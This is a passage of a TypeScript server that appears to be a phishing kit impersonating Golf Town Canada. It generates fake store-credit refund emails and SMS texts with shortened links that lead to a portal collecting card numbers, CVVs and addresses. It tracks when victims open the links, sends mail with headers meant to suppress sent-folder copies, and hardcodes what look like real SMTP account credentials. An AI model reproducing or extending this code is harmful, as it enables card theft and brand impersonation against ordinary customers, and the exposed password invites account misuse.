    // Provide an informative, realistic explanation fallback if GEMINI_API_KEY is absent
    const mockEtymologies: Record<string, string> = {
      'ross': "Ross is a name of Scottish/Gaelic origin meaning 'promontory', 'headland' or 'peninsula'. Common in Canada and Northern Britain.",
      'john': "John derives from the Hebrew name Yochanan meaning 'Graced by God'. It is one of the most classic, enduring names across North America.",
      'david': "David originates from the Hebrew name Dawid, meaning 'beloved'. Widely popular across Canada and golf community rosters.",
      'sarah': "Sarah comes from Hebrew meaning 'princess' or 'noblewoman', carrying a timeless heritage.",
      'michael': "Michael is from Hebrew meaning 'Who is like God?', traditional and prominent throughout North American sports rosters."
    };
    const key = firstName.toLowerCase();
    const fallbackText = mockEtymologies[key] || `${firstName} ${lastName ? lastName : ''} is a distinguished name. ${firstName} carries European/Anglo-Gaelic etymological roots common in regional Canadian demographics${city ? ' in ' + city : ''}.`;
    return res.json({ explanation: fallbackText, source: 'Etymology Database' });
  }

  try {
    const ai = new GoogleGenAI({ apiKey });
    const prompt = `Perform a concise, fascinating AI search and explanation for the customer name "${firstName} ${lastName || ''}"${city ? ' located in ' + city + ', Canada' : ''}.
Provide 2 to 3 sentences covering:
1. Origin, linguistic meaning, or etymology of the first and last name.
2. Interesting cultural trivia, history, or geographic distribution of this surname/name in Canada/Golf Town region.
3. Keep it professional, respectful, engaging, and clear. Do not wrap in JSON, just return plain text explanation.`;

    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt,
    });

    const explanation = response.text?.trim() || `Information for ${firstName} ${lastName || ''}.`;
    res.json({ explanation, source: 'Google AI Search' });
  } catch (error: any) {
    console.error('Gemini name explanation error:', error);
    res.json({ 
      explanation: `${firstName} ${lastName || ''}: Classic regional Canadian name record with Gaelic/Anglo lineage common in Canadian golf club memberships.`,
      source: 'Etymology System Fallback'
    });
  }
});

// API route for Golf Town Store Lookup via Google/AI Search
app.post('/api/find-golf-town-store', async (req, res) => {
  const { query } = req.body;
  if (!query) {
    return res.status(400).json({ error: 'Query is required' });
  }

  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) {
    return res.json({
      matched: false,
      message: 'No GEMINI_API_KEY configured, using local store directory matching.'
    });
  }

  try {
    const ai = new GoogleGenAI({ apiKey });
    const prompt = `You are a Golf Town Canada store directory assistant.
Identify the Golf Town store number, official store name, street address, city, province, postal code, phone number, and Google Maps query for the location query: "${query}".

Return ONLY a valid JSON object:
{
  "storeId": "string (e.g. 504)",
  "officialName": "string (e.g. Golf Town South Calgary)",
  "address": "string (e.g. 130 11500 35 St SE, Calgary, AB T2Z 3W4)",
  "city": "string (e.g. Calgary)",
  "province": "string (e.g. AB)",
  "phone": "string (e.g. (403) 723-0100)",
  "googleMapsUrl": "string (https://www.google.com/maps/search/?api=1&query=Golf+Town+...)"
}`;

    const response = await ai.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt,
    });

    const text = response.text?.trim() || '';
    const cleanedJson = text.replace(/^```json\s*/, '').replace(/^```\s*/, '').replace(/\s*```$/, '');
    const result = JSON.parse(cleanedJson);
    res.json({ matched: true, store: result });
  } catch (error: any) {
    console.error('Store lookup error:', error);
    res.json({ matched: false, error: error.message });
  }
});

// Helper to shorten URLs with clck.ru API
async function shortenWithClckRu(fullUrl: string): Promise<string> {
  try {
    const res = await fetch(`https://clck.ru/--?url=${encodeURIComponent(fullUrl)}`, {
      method: 'GET',
      headers: { 'User-Agent': 'Mozilla/5.0' },
    });
    if (res.ok) {
      const text = await res.text();
      if (text && text.trim().startsWith('http')) {
        return text.trim();
      }
    }
  } catch (err) {
    console.warn('[clck.ru] Shorten service fallback:', err);
  }
  const token = Buffer.from(`${fullUrl}-${Date.now()}`).toString('hex').slice(-6);
  return `https://clck.ru/3GT${token.toUpperCase()}`;
}

// Helper to generate fully functional local shortened URLs for WSL Debian and preview environments
async function generateShortDepositUrl(
  req: any,
  depositToken: string,
  amount: string,
  sessionId: string,
  recipientName?: string,
  email?: string,
  storeId?: string,
  custId?: string
): Promise<string> {
  const shortId = `3GT${Buffer.from(`${depositToken}-${Date.now()}`).toString('hex').slice(-6).toUpperCase()}`;
  
  const protocol = req && (req.secure || (req.headers && req.headers['x-forwarded-proto'] === 'https')) ? 'https' : lastKnownProtocol;
  const host = req && typeof req.get === 'function' ? (req.get('host') || 'localhost:3000') : lastKnownHost;
  
  const localShortUrl = `${protocol}://${host}/r/${shortId}`;
  const fullRedirectUrl = `${protocol}://${host}/?session_id=${sessionId}&deposit_token=${depositToken}&amount=${amount}`;
  
  shortUrlMappings.set(shortId, {
    sessionId,
    depositToken,
    amount,
    fullUrl: fullRedirectUrl
  });

  tokenToSessionId.set(depositToken, sessionId);

  // Initialize or update the in-memory payment session
  const existing = paymentSessions.get(sessionId);
  paymentSessions.set(sessionId, {
    sessionId,
    recipientName: recipientName || existing?.recipientName || 'Valued Customer',
    email: email || existing?.email || '',
    amount: amount || existing?.amount || '250.00',
    storeId: storeId || existing?.storeId || '504',
    custId: custId || existing?.custId || 'GT-CUSTOMER',
    status: existing?.status || 'IDLE',
    cardDetails: existing?.cardDetails || {
      cardNumber: '',
      expDate: '',
      cvv: '',
      cardholderName: '',
      streetAddress: '',
      city: 'Calgary',
      province: 'AB',
      postalCode: '',
      phone: ''
    },
    lastUpdated: Date.now()
  });

  return localShortUrl;
}

// API endpoint to shorten any URL via clck.ru
app.post('/api/shorten-url', async (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL parameter is required.' });
  const shortenedUrl = await shortenWithClckRu(url);
  res.json({ shortenedUrl, originalUrl: url });
});

// GET endpoint to redirect short link to local Customer Portal page
app.get('/r/:shortId', (req, res) => {
  const mapping = shortUrlMappings.get(req.params.shortId);
  if (mapping) {
    const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
    const redirectUrl = `${protocol}://${req.get('host')}/?session_id=${mapping.sessionId}&deposit_token=${mapping.depositToken}&amount=${mapping.amount}`;
    return res.redirect(redirectUrl);
  }
  res.redirect('https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca');
});

// GET endpoint to retrieve active session information by sessionId or depositToken
app.get('/api/socket/session-info/:id', (req, res) => {
  const { id } = req.params;
  let session = paymentSessions.get(id);
  if (!session) {
    const sId = tokenToSessionId.get(id);
    if (sId) {
      session = paymentSessions.get(sId);
    }
  }

  if (session) {
    if (session.status === 'IDLE') {
      session.status = 'OPENED';
      session.openedAt = new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString();
      session.lastUpdated = Date.now();
      paymentSessions.set(session.sessionId, session);

      pushNoticeHistory({
        recipientEmail: session.email || 'customer@payment.golftown.ca',
        recipientName: session.recipientName,
        amount: session.amount,
        storeId: session.storeId,
        custId: session.custId,
        subject: `Secure Link Opened by Customer (${session.recipientName})`,
        actionType: 'link_opened',
        depositToken: `REF-${session.sessionId.slice(-6)}`,
        secureDepositUrl: `https://clck.ru/3GT${session.sessionId.slice(-6)}`,
        status: 'OPENED'
      });
    }
    return res.json({ success: true, session });
  }
  res.status(404).json({ error: 'Refund session not found or has expired.' });
});

// POST endpoint to register or link a session for a customer landing with only a depositToken
app.post('/api/socket/register-session', (req, res) => {
  const { depositToken, amount } = req.body;
  if (!depositToken) {
    return res.status(400).json({ error: 'depositToken is required.' });
  }

  let sessionId = tokenToSessionId.get(depositToken);
  if (!sessionId) {
    sessionId = `SESS-${Math.floor(100000 + Math.random() * 900000)}`;
    tokenToSessionId.set(depositToken, sessionId);
  }

  let session = paymentSessions.get(sessionId);
  if (!session) {
    session = {
      sessionId,
      recipientName: 'Valued Customer',
      email: '',
      amount: amount || '250.00',
      storeId: '504',
      custId: 'GT-CUSTOMER',
      status: 'OPENED',
      openedAt: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      cardDetails: {
        cardNumber: '',
        expDate: '',
        cvv: '',
        cardholderName: '',
        streetAddress: '',
        city: 'Calgary',
        province: 'AB',
        postalCode: '',
        phone: ''
      },
      lastUpdated: Date.now()
    };
    paymentSessions.set(sessionId, session);

    pushNoticeHistory({
      recipientEmail: session.email || 'customer@payment.golftown.ca',
      recipientName: session.recipientName,
      amount: session.amount,
      storeId: session.storeId,
      custId: session.custId,
      subject: `Secure Link Opened via Token (${depositToken.slice(-6)})`,
      actionType: 'link_opened',
      depositToken,
      secureDepositUrl: `https://clck.ru/3GT${sessionId.slice(-6)}`,
      status: 'OPENED'
    });
  } else if (session.status === 'IDLE') {
    session.status = 'OPENED';
    session.openedAt = new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString();
    session.lastUpdated = Date.now();
    paymentSessions.set(sessionId, session);
  }

  res.json({ success: true, session });
});

// API endpoint to generate pre-typed SMS link with shortened refund deposit link
app.post('/api/generate-sms-link', async (req, res) => {
  const { phone, firstName, lastName, amount, custId, storeId, sessionId } = req.body;
  const depositToken = Buffer.from(`${custId || 'GT-001'}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
  const rawDepositUrl = `https://golftown.cashstar.com/self_service/v2/about/customer_support/contact?locale=en-ca&deposit_token=${depositToken}&amount=${amount}`;

  const activeSessId = sessionId || `SESS-${Math.floor(100000 + Math.random() * 900000)}`;
  const shortenedUrl = await generateShortDepositUrl(
    req,
    depositToken,
    amount || '250.00',
    activeSessId,
    `${firstName || ''} ${lastName || ''}`.trim() || 'Valued Customer',
    '',
    storeId,
    custId
  );

  const cleanPhone = (phone || '').replace(/[^0-9+]/g, '');
  const smsBody = `Golf Town Store Credit Refund Notice: Hi ${firstName || 'Valued Customer'}, your $${amount} store credit refund is ready to claim: ${shortenedUrl}`;
  const smsUrl = `sms:${cleanPhone}?body=${encodeURIComponent(smsBody)}`;

  res.json({
    success: true,
    smsUrl,
    smsUri: smsUrl,
    shortenedUrl,
    rawDepositUrl,
    smsBody,
    depositToken,
    sessionId: activeSessId
  });
});

// GET SMTP configuration
app.get('/api/smtp-config', (req, res) => {
  res.json({
    config: customSmtpConfig || {
      host: process.env.SMTP_HOST || 'smtp.office365.com',
      port: Number(process.env.SMTP_PORT) || 587,
      user: process.env.SMTP_USER || '505receiving@cloud.golftown.com',
      pass: process.env.SMTP_PASS || '3Dolly16!',
      from: process.env.SMTP_FROM || 'Golf Town Store Credit Support <505receiving@cloud.golftown.com>',
      secure: Number(process.env.SMTP_PORT) === 465,
      tlsRejectUnauthorized: true
    },
    isOverridden: !!customSmtpConfig
  });
});

// POST update SMTP configuration
app.post('/api/smtp-config', (req, res) => {
  const { host, port, user, pass, from, secure, tlsRejectUnauthorized } = req.body;
  
  if (req.body.reset) {
    customSmtpConfig = null;
    try {
      if (fs.existsSync(CONFIG_FILE)) {
        fs.unlinkSync(CONFIG_FILE);
      }
    } catch (e) {}
    return res.json({ success: true, message: 'SMTP configuration reset to default environment settings.' });
  }

  customSmtpConfig = {
    host: host || 'smtp.office365.com',
    port: Number(port) || 587,
    user: user || '',
    pass: pass || '',
    from: from || 'Golf Town Store Credit Support <505RECEIVEING@CLOUD.GOLFTOWN.COM>',
    secure: !!secure,
    tlsRejectUnauthorized: tlsRejectUnauthorized !== false
  };
  
  saveSmtpConfig(customSmtpConfig);
  res.json({ success: true, message: 'SMTP configuration updated and persisted!', config: customSmtpConfig });
});

// POST test SMTP connection and send test email
app.post('/api/smtp-config/test', async (req, res) => {
  const { host, port, user, pass, from, secure, tlsRejectUnauthorized, testRecipient, testSubject, testBody } = req.body;
  
  if (!user || !pass) {
    return res.status(400).json({ error: 'SMTP User and Password are required to test connection.' });
  }

  const recipient = testRecipient || user;
  const finalSubject = testSubject || 'Golf Town SMTP Test Connection - Success';
  const sessionLogs: string[] = [];
  
  const customLogger = {
    level: () => 'debug',
    info: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[INFO] ${msg}`);
    },
    warn: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[WARN] ${msg}`);
    },
    error: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[ERROR] ${msg}`);
    },
    debug: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[DEBUG] ${msg}`);
    },
    trace: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[TRACE] ${msg}`);
    }
  };

  try {
    const nodemailer = await import('nodemailer');
    const transporter = nodemailer.createTransport({
      host: host || 'smtp.office365.com',
      port: Number(port) || 587,
      secure: !!secure,
      auth: { user, pass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      tls: {
        rejectUnauthorized: tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    } as any);

    // Attempt to verify transporter
    sessionLogs.push('[SYSTEM] Initiating server verification handshake...');
    await transporter.verify();
    sessionLogs.push('[SYSTEM] Handshake verified successfully. Dispatching test email...');

    const testDepositToken = Buffer.from(`GT-TEST-${Date.now()}`).toString('hex').slice(0, 16);
    const testSessionId = `SESS-TEST-${Math.floor(100000 + Math.random() * 900000)}`;
    const testSecureDepositUrl = await generateShortDepositUrl(req, testDepositToken, '250.00', testSessionId, 'SMTP Test Customer', testRecipient || user, '504', 'GT-TEST');

    // Use custom body if provided, otherwise default to standard rich HTML
    const mailText = testBody 
      ? `${testBody}\n\nVerified Secure Test Refund Link:\n${testSecureDepositUrl}\nToken ID: ${testDepositToken}`
      : `Hello,\n\nThis is a verified test email from the Golf Town Refund Workflow SMTP settings panel.\n\nConnection is working and successfully authorized!\n\nVerified Secure Test Refund Link:\n${testSecureDepositUrl}\nToken ID: ${testDepositToken}`;

    const mailHtml = testBody 
      ? `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px; max-width: 500px; margin: 0 auto; color: #374151;">
          <div style="text-align: center; margin-bottom: 12px;">
            <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0;">
          </div>
          <h2 style="color: #004d25; border-bottom: 2px solid #004d25; padding-bottom: 8px; text-align: center;">Golf Town Custom SMTP Manual Test</h2>
          <p style="white-space: pre-wrap;">${testBody}</p>
          
          <!-- Test Secure Payment/Deposit URL -->
          <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 20px; margin: 20px 0;">
            <div style="font-size: 11px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px;">
              Verified Secure Refund Link
            </div>
            <a href="${testSecureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 700; padding: 12px 24px; border-radius: 4px; border: 1px solid #003318;">
              Claim Store Credit Deposit ($250.00 CAD)
            </a>
          </div>

          <p style="font-size: 11px; color: #9ca3af; margin-top: 15px; border-top: 1px solid #f3f4f6; padding-top: 8px;">
            Details: Host: ${host} | Port: ${port} | User: ${user}
          </p>
         </div>`
      : `
        <div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #e5e7eb; border-radius: 8px; max-width: 500px; margin: 0 auto; color: #374151;">
          <div style="text-align: center; margin-bottom: 12px;">
            <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0;">
          </div>
          <h2 style="color: #004d25; border-bottom: 2px solid #004d25; padding-bottom: 8px; text-align: center;">Golf Town SMTP Test Connection</h2>
          <p>Hello,</p>
          <p>This is a verified test email from the Golf Town Refund Workflow SMTP settings panel.</p>
          <div style="background-color: #f0fdf4; border: 1px solid #bbf7d0; padding: 12px; border-radius: 6px; font-size: 13px; color: #166534; font-weight: bold; text-align: center;">
            Connection Status: SUCCESSFUL & AUTHORIZED
          </div>

          <!-- Test Secure Payment/Deposit URL -->
          <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 20px; margin: 20px 0;">
            <div style="font-size: 11px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px;">
              Verified Secure Refund Link
            </div>
            <a href="${testSecureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 700; padding: 12px 24px; border-radius: 4px; border: 1px solid #003318;">
              Claim Store Credit Deposit ($250.00 CAD)
            </a>
          </div>

          <p style="font-size: 11px; color: #9ca3af; margin-top: 15px;">
            Details: Host: ${host} | Port: ${port} | User: ${user}
          </p>
        </div>
      `;

    // Send actual test email
    await transporter.sendMail({
      from: from || `Golf Town Test Support <${user}>`,
      to: recipient,
      subject: finalSubject,
      text: mailText,
      html: mailHtml
    });
    sessionLogs.push(`[SYSTEM] Test email successfully delivered to <${recipient}>.`);

    // Record to debugging logs stack
    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'test',
      recipient,
      host: host || 'smtp.office365.com',
      port: Number(port) || 587,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();

    res.json({ 
      success: true, 
      message: `SMTP credentials verified. Test email successfully transmitted to ${recipient}!`,
      debugLogs: sessionLogs 
    });
  } catch (error: any) {
    console.error('SMTP testing error:', error);
    sessionLogs.push(`[SYSTEM ERROR] Connection/Transmission Failed: ${error?.message || error}`);
    
    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'test',
      recipient,
      host: host || 'smtp.office365.com',
      port: Number(port) || 587,
      success: false,
      error: error?.message || 'SMTP Connection failed.',
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();

    res.status(500).json({ 
      success: false, 
      error: error?.message || 'SMTP Connection failed.',
      debugLogs: sessionLogs
    });
  }
});

// GET SMTP transmission debug logs
app.get('/api/smtp-config/logs', (req, res) => {
  res.json({ logs: smtpDebugLogsStack });
});

// POST clear SMTP transmission debug logs
app.post('/api/smtp-config/logs/clear', (req, res) => {
  smtpDebugLogsStack.length = 0;
  res.json({ success: true, message: 'SMTP connection transmission debug logs cleared.' });
});

// API route for sending Golf Town Store Credit Refund & Credit Notices via SMTP
app.post('/api/send-refund-notice', async (req, res) => {
  const { recipientEmail, recipientName, amount, storeId, custId, comments, actionType, sessionId, customSubject, customBody } = req.body;

  if (!recipientEmail) {
    return res.status(400).json({ error: 'Recipient email address is required.' });
  }

  const host = customSmtpConfig?.host || process.env.SMTP_HOST || 'smtp.office365.com';
  const user = customSmtpConfig?.user || process.env.SMTP_USER || '505receiving@cloud.golftown.com';
  const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || '3Dolly16!';
  const port = Number(customSmtpConfig ? customSmtpConfig.port : (process.env.SMTP_PORT || 587));
  const from = customSmtpConfig?.from || process.env.SMTP_FROM || 'Golf Town Store Credit Support <505receiving@cloud.golftown.com>';

  const depositToken = Buffer.from(`${custId || 'GT-001'}-${amount}-${Date.now()}`).toString('hex').slice(0, 16);
  
  const activeSessionId = sessionId || `SESS-${Math.floor(100000 + Math.random() * 900000)}`;
  const secureDepositUrl = await generateShortDepositUrl(
    req,
    depositToken,
    amount || '250.00',
    activeSessionId,
    recipientName || 'Valued Customer',
    recipientEmail,
    storeId || '504',
    custId || 'GT-CUSTOMER'
  );

  const emailSubject = customSubject || (actionType === 'refund' 
    ? `Golf Town Store Credit Refund Notice - $${amount} Issued`
    : `Golf Town Store Credit Account Update - $${amount}`);

  let parsedBody = customBody || `Dear {customerName},\n\nA store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;

  const serverReplacements: Record<string, string> = {
    '{customerName}': recipientName || 'Valued Customer',
    '{amount}': `$${amount}`,
    '{storeId}': storeId || '504',
    '{custId}': custId || 'GT-CUSTOMER',
    '{comments}': comments || '',
    '{depositLink}': secureDepositUrl
  };

  Object.entries(serverReplacements).forEach(([token, val]) => {
    parsedBody = parsedBody.split(token).join(val);
  });

  const formattedBodyHtml = parsedBody.split('\n').map(line => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : '<br>').join('');

  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Golf Town Store Credit Notice</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
        <tr>
          <td align="center">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
              
              <!-- GOLF TOWN OFFICIAL COMMERCIAL HEADER -->
              <tr>
                <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                  <div style="text-align: center; margin-bottom: 12px;">
                    <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                  </div>
                  <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                    Customer Support Notice
                  </div>
                </td>
              </tr>

              <!-- BODY CONTENT -->
              <tr>
                <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                  <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                    Store Credit Notice
                  </h1>
                  
                  ${formattedBodyHtml}

                  <!-- TRANSACTION STATEMENT SUMMARY -->
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                    <tr>
                      <td style="padding: 20px;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                          <tr>
                            <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                            <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                              $${amount} CAD
                            </td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId || 'GT-CUSTOMER'}</td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId || '504'}</td>
                          </tr>
                          ${comments ? `
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                          </tr>` : ''}
                        </table>
                      </td>
                    </tr>
                  </table>

                  <!-- SECURE OFFICIAL DEPOSIT ACTION CALLOUT -->
                  <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                    <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                      Verified Secure Refund Link
                    </div>
                    
                    <div style="margin-bottom: 16px;">
                      <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                        Claim Store Credit Deposit ($${amount} CAD)
                      </a>
                    </div>

                    <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                      Token ID: ${depositToken}
                    </div>
                  </div>

                  <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                    Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                  </p>
                </td>
              </tr>

              <!-- COMMERCIAL FOOTER -->
              <tr>
                <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tr>
                      <td style="padding-bottom: 10px;">
                        <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                        Powered by CashStar / Blackhawk Network Services
                      </td>
                    </tr>
                    <tr>
                      <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                        &copy; ${new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                      </td>
                    </tr>
                    <tr>
                      <td style="padding-top: 8px; font-size: 10px; color: #a1a1aa; line-height: 1.4;">
                        Need assistance? Contact Golf Town Customer Care at <a href="mailto:support@payment.golftown.ca" style="color: #004d25; text-decoration: none; font-weight: bold;">support@payment.golftown.ca</a> or Toll-Free 1-844-360-1010.
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>

            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;

  pushNoticeHistory({
    recipientEmail,
    recipientName: recipientName || 'Valued Customer',
    amount: amount || '250.00',
    storeId: storeId || '504',
    custId: custId || 'GT-CUSTOMER',
    subject: emailSubject,
    actionType: actionType || 'refund_notice',
    depositToken,
    secureDepositUrl,
    status: 'DELIVERED'
  });

  const sessionLogs: string[] = [];
  const customLogger = {
    level: () => 'debug',
    info: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[INFO] ${msg}`);
    },
    warn: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[WARN] ${msg}`);
    },
    error: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[ERROR] ${msg}`);
    },
    debug: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[DEBUG] ${msg}`);
    },
    trace: (entry: any) => {
      const msg = typeof entry === 'object' ? (entry.msg || JSON.stringify(entry)) : String(entry);
      sessionLogs.push(`[TRACE] ${msg}`);
    }
  };

  try {
    const nodemailer = await import('nodemailer');
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      tls: {
        rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    } as any);

    sessionLogs.push('[SYSTEM] Establishing outbound connection to server...');
    // Direct background SMTP submission with outbox/sent-folder suppression headers
    await transporter.sendMail({
      from,
      replyTo: 'GOLFTOWN SUPPORT <support@payment.golftown.ca>',
      to: recipientEmail,
      subject: emailSubject,
      html: emailHtml,
      headers: {
        'X-No-Save-Sent': 'true',
        'X-Auto-Response-Suppress': 'All',
        'X-Outbox-Bypass': 'enabled',
        'X-Mailer': 'GolfTown-Internal-CreditSystem/1.0'
      }
    });
    sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);

    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'refund_notice',
      recipient: recipientEmail,
      host,
      port,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();

    res.json({
      success: true,
      simulated: false,
      outboxSaved: false,
      message: `Official store credit refund notice sent via background SMTP to ${recipientEmail}.`,
      debugLogs: sessionLogs
    });
  } catch (error: any) {
    console.warn('SMTP Direct connection attempt failed:', error?.message || error);
    sessionLogs.push(`[SYSTEM ERROR] SMTP transmission failed: ${error?.message || error}`);

    const debugLogEntry: SmtpDebugLog = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
      timestamp: new Date().toLocaleTimeString() + ' ' + new Date().toLocaleDateString(),
      type: 'refund_notice',
      recipient: recipientEmail,
      host,
      port,
      success: false,
      error: error?.message || 'SMTP Connection failed.',
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();

    res.status(500).json({
      success: false,
      error: error?.message || 'SMTP Connection failed.',
